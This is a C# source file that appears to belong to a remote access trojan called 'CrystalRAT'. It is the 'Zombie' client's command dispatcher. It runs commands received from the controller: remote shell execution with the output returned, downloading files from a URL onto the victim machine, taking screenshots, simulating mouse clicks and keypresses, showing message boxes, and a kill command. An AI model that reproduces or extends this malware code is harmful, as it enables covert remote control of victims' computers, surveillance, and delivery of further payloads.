using CrystalRATShared.Commands;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Zombie.Web;

namespace Zombie.Functions
{
    public static class FunctionManager
    {

        public static void Process(CommandFlags flag, BinaryReader reader)
        {
            switch (flag)
            {
                case CommandFlags.DataCorrupted:
                    Client.RestartSocket();
                    break;
                case CommandFlags.RemoteCMD:
                    Client.Send(RemoteCMD.ExecuteCommand(reader.ReadString()));
                    break;
                case CommandFlags.ZombieDownloadFileRequest:
                    Client.Send(Download.FromURL(reader.ReadString(), reader.ReadString()));
                    break;
                case CommandFlags.Screenshot:
                    Client.Send(Screenshot.Take(reader.ReadString()));
                    break;
                case CommandFlags.Click:
                    MousePoint mp = InputControl.ConvertScreenPointToCurrent(reader.ReadInt32(), reader.ReadInt32(), reader.ReadInt32(), reader.ReadInt32());
                    InputControl.LeftClickOnPoint(mp.X, mp.Y);
                    break;
                case CommandFlags.KeyboardKey:
                    InputControl.KeyboardPress(reader.ReadInt32());
                    break;
                case CommandFlags.Kill:
                    Kill.Request();
                    break;
                case CommandFlags.MessageBox:
                    Dialog.Show(reader.ReadString(), reader.ReadString(), (MessageBoxButtons)reader.ReadInt32(), (MessageBoxIcon)reader.ReadInt32());
                    break;

            }
        }

    }
}
